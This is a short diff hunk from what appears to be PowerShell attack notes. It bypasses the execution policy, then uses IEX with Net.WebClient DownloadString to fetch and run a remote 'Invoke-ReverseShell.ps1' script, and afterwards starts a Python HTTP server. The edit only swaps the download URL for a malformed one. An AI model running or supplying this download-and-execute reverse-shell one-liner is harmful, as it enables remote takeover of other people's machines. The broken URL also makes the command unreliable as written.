@@ -16,7 +16,7 @@ Get-ExecutionPolicy
 
 Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/usuario/repo/main/Invoke-ReverseShell.ps1')
+IEX (New-Object Net.WebClient).DownloadString('https://https:/github.com/Ray-King11/TESTE/tree/main/Invoke-ReverseShell.ps1')
 
 
 python3 -m http.server 8080
